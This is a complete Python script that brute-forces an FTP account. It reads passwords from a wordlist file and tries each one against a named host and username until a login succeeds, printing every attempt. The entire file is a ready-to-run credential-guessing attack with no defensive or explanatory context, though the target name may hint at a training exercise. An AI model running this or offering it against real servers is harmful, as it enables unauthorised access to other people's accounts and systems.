import ftplib

def ftp_login(host, port, username, password):
    try:
        # Create an FTP object and connect to the server
        ftp = ftplib.FTP()
        ftp.connect(host, port)
        ftp.login(username, password)
        print(f"Login successful with password: {password}")
        return True
    except ftplib.error_perm as e:
        print(f"Login failed with password: {password}")
        return False
    finally:
        # Close the FTP connection
        ftp.quit()

def check_passwords(host, port, username, dictionary_file):
    with open(dictionary_file, 'r') as file:
        for line in file:
            password = line.strip()
            if ftp_login(host, port, username, password):
                # If login is successful, you can break out of the loop or perform additional actions
                break

# Replace these values with your actual FTP information
ftp_host = 'services.cyberprotection.agency'
ftp_port = 2121
ftp_username = 'secure_user'
password_dictionary_file = 'words.txt'

# Call the function to check passwords
check_passwords(ftp_host, ftp_port, ftp_username, password_dictionary_file)
